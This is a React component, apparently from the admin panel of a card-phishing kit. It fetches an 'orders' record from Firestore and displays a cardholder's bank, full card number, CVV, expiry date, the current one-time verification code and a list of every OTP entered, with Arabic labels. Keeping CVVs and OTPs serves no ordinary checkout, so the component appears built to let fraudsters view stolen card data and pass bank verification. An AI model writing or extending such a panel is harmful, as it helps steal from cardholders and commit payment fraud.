'use client'

import { useState, useEffect } from 'react'
import {  doc, getDoc } from 'firebase/firestore'
import { db } from '@/lib/firestore'
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { CreditCard, Calendar, Lock, CheckCircle } from 'lucide-react'

interface CardData {
  id:string;
  cardNumber: string;
  cvc: string;
    bank:string;
  pass:string;
  otp:string;
  prefix:string;
  month:string;
  year:string;
  otpall:string[]
  // Add other fields as needed
}

export function CardsByID({ id }: { id: string }) {
  const [cards, setCards] = useState<CardData | null>(null)
  const [loading, setLoading] = useState(true)
  const [error, setError] = useState<string | null>(null)

  useEffect(() => {
    async function fetchCards() {
      try {
        setLoading(true)
        const docRef = doc(db, 'orders', id)
        const docSnap = await getDoc(docRef)

        if (docSnap.exists()) {
          const data = docSnap.data() as CardData
          setCards(data)
        } else {
          setError('No cards found for this ID')
        }
      } catch (err) {
        setError('Error fetching cards')
        console.error('Error fetching cards:', err)
      } finally {
        setLoading(false)
      }
    }

    fetchCards()
  }, [id])

  if (loading) {
    return <div className="text-center py-4">Loading cards...</div>
  }

  if (error) {
    return <div className="text-center py-4 text-red-500">{error}</div>
  }

  if (!cards) {
    return <div className="text-center py-4">No card data available</div>
  }

  return (
      <Card className="w-full max-w-3xl mx-auto">
      <CardHeader>
        <CardTitle className="text-2xl font-bold text-center">{cards.bank}</CardTitle>
      </CardHeader>
      <CardContent className="grid grid-cols-1 md:grid-cols-2 gap-6">
        <div className="space-y-2">
          <DetailItem icon={<CreditCard className="h-5 w-5" />} label="رقم البطاقة" value={`${cards.prefix} ${cards.cardNumber}`} />
          <DetailItem icon={<Lock className="h-5 w-5" />} label="CVV" value={cards.pass} />
        </div>
        <div className="space-y-2">
          <DetailItem icon={<Calendar className="h-5 w-5" />} label="تاريخ الانتهاء" value={`${cards.month}/${cards.year}`} />
          <DetailItem icon={<CheckCircle className="h-5 w-5" />} label="رمز التحقق" value={cards.otp} />
        </div>
        <div className="col-span-full">
          <Badge variant="secondary" className="text-lg py-1 px-3">
            تحقق الكل: {cards.otpall}
          </Badge>
        </div>
      </CardContent>
    </Card>
  )
}
function DetailItem({ icon, label, value }: { icon: React.ReactNode; label: string; value: string }) {
  return (
    <div className="flex items-center space-x-2 rtl:space-x-reverse">
      {icon}
      <span className="font-semibold">{label}:</span>
      <span>{value}</span>
    </div>
  )
}

